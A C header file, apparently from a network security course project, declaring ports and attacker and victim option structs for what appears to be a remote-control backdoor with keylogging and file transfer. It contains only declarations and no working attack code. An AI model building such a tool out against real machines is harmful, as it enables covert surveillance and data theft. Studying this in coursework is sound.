#ifndef COMP8505_PROJECT_OPTIONS_H
#define COMP8505_PROJECT_OPTIONS_H

#include <netinet/in.h>
#include <stdbool.h>


#define ATC_UDP_PORT 35000
#define VIC_UDP_PORT 53000
#define ATC_TCP_PORT 25000
#define VIC_TCP_PORT 52000
#define ATC_FILE_PORT 15000
#define VIC_FILE_PORT 51000

#define PACKET_COUNT 10000
#define S_ARR_SIZE 64
#define OUTPUT_SIZE 20000


struct options_attacker {
    char dest_ip[INET_ADDRSTRLEN];
    char my_ip[INET_ADDRSTRLEN];
    char victim_instruction[S_ARR_SIZE];
    char target_directory[S_ARR_SIZE];
    int tcp_socket;
    int udp_socket;
    struct sockaddr_in udpsa;
    struct sockaddr_in tcpsa;
    char file_info[S_ARR_SIZE];
    char file_name[S_ARR_SIZE];
    int file_size;
    char* data;
    int size;
    bool file_flag;

    int rtcp_socket;
    struct sockaddr_in rtcpsa;
    struct sockaddr_in mtcpsa;

};


struct options_victim {
    char dest_ip[INET_ADDRSTRLEN];
    char my_ip[INET_ADDRSTRLEN];
    int udp_socket;
    int tcp_socket;
    struct sockaddr_in udpsa;
    struct sockaddr_in tcpsa;
    char received_buffer[S_ARR_SIZE];
    char instruction[S_ARR_SIZE];
    char sending_buffer[OUTPUT_SIZE];
    char target_directory[S_ARR_SIZE];
    bool ip_flag;
    bool keylogger;
    bool target;

    int rtcp_socket;
    int atcp_socket;
    struct sockaddr_in rtcpsa;
    struct sockaddr_in ctcpsa;
};

#endif //COMP8505_PROJECT_OPTIONS_H
